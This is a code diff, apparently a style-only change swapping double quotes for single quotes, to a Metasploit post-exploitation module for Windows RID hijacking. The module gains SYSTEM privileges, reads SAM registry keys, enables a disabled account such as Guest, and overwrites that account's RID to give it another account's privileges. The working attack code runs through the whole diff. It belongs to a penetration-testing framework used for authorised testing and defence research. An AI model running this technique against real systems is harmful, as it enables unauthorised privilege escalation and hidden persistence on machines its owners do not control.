@@ -59,7 +59,7 @@ class MetasploitModule < Msf::Post
 
   def get_name_from_rid(reg_key, rid, names_key)
     names_key.each do |name|
-      skey = registry_getvalinfo(reg_key + "\\Names\\#{name}", "")
+      skey = registry_getvalinfo(reg_key + "\\Names\\#{name}", '')
       rid_user = skey['Type']
       return name if rid_user == rid
     end
@@ -71,7 +71,7 @@ class MetasploitModule < Msf::Post
       next unless name.casecmp(username).zero?
 
       print_good("Found #{name} account!")
-      skey = registry_getvalinfo(reg_key + "\\Names\\#{name}", "")
+      skey = registry_getvalinfo(reg_key + "\\Names\\#{name}", '')
       rid = skey['Type']
       if !skey
         print_error("Could not open user's key")
@@ -83,7 +83,7 @@ class MetasploitModule < Msf::Post
   end
 
   def check_active(fbin)
-    if fbin[0x38].unpack("H*")[0].to_i != 10
+    if fbin[0x38].unpack('H*')[0].to_i != 10
       return true
     else
       return false
@@ -92,7 +92,7 @@ class MetasploitModule < Msf::Post
 
   def swap_rid(fbin, rid)
     # This function will set hex format to a given RID integer
-    hex = [format("%04x", rid).scan(/.{2}/).reverse.join].pack("H*")
+    hex = [format('%04x', rid).scan(/.{2}/).reverse.join].pack('H*')
     # Overwrite new RID at offset 0x30
     fbin[0x30, 2] = hex
     return fbin
@@ -103,32 +103,32 @@ class MetasploitModule < Msf::Post
     reg_key = 'HKLM\\SAM\\SAM\\Domains\\Account\\Users'
 
     # Checks privileges of the session, and tries to get SYSTEM privileges if needed.
-    print_status("Checking for SYSTEM privileges on session")
+    print_status('Checking for SYSTEM privileges on session')
     if !is_system?
       if datastore['GETSYSTEM']
-        print_status("Trying to get SYSTEM privileges")
+        print_status('Trying to get SYSTEM privileges')
         if getsystem
-          print_good("Got SYSTEM privileges")
+          print_good('Got SYSTEM privileges')
         else
-          print_error("Could not obtain SYSTEM privileges")
+          print_error('Could not obtain SYSTEM privileges')
           return
         end
       else
-        print_error("Session is not running with SYSTEM privileges. Try setting GETSYSTEM ")
+        print_error('Session is not running with SYSTEM privileges. Try setting GETSYSTEM ')
         return
       end
     else
-      print_good("Session is already running with SYSTEM privileges")
+      print_good('Session is already running with SYSTEM privileges')
     end
 
     # Checks the Windows Version.
-    wver = sysinfo["OS"]
+    wver = sysinfo['OS']
     print_status("Target OS: #{wver}")
 
     # Load the usernames from SAM Registry key
     names_key = registry_enumkeys(reg_key + '\\Names')
     unless names_key
-      print_error("Could not access to SAM registry keys")
+      print_error('Could not access to SAM registry keys')
       return
     end
 
@@ -137,11 +137,11 @@ class MetasploitModule < Msf::Post
     username = datastore['USERNAME']
     if datastore['GUEST_ACCOUNT']
       user_rid = 0x1f5
-      print_status("Target account: Guest Account")
+      print_status('Target account: Guest Account')
       username = get_name_from_rid(reg_key, user_rid, names_key)
     else
       if datastore['USERNAME'].to_s.empty?
-        print_error("You must set an username or enable GUEST_ACCOUNT option")
+        print_error('You must set an username or enable GUEST_ACCOUNT option')
         return
       end
       print_status('Checking users...')
@@ -150,7 +150,7 @@ class MetasploitModule < Msf::Post
 
     # Result of the RID harvesting
     if user_rid == -1
-      print_error("Could not find the specified username")
+      print_error('Could not find the specified username')
       return
     else
       print_status("Target account username: #{username}")
@@ -162,20 +162,20 @@ class MetasploitModule < Msf::Post
     users_key.each do |r|
       next if r.to_i(16) != user_rid
 
-      f = registry_getvaldata(reg_key + "\\#{r}", "F")
+      f = registry_getvaldata(reg_key + "\\#{r}", 'F')
       if check_active(f)
-        print_status("Account is disabled, activating...")
-        f[0x38] = ["10"].pack("H")
-        print_good("Target account enabled")
+        print_status('Account is disabled, activating...')
+        f[0x38] = ['10'].pack('H')
+        print_good('Target account enabled')
       else
-        print_good("Target account is already enabled")
+        print_good('Target account is already enabled')
       end
 
-      print_status("Overwriting RID")
+      print_status('Overwriting RID')
       # Overwrite RID to specified RID
       f = swap_rid(f, datastore['RID'])
 
-      open_key = registry_setvaldata(reg_key + "\\#{r}", "F", f, "REG_BINARY")
+      open_key = registry_setvaldata(reg_key + "\\#{r}", 'F', f, 'REG_BINARY')
       unless open_key
         print_error("Can't write to registry... Something's wrong!")
         return -1
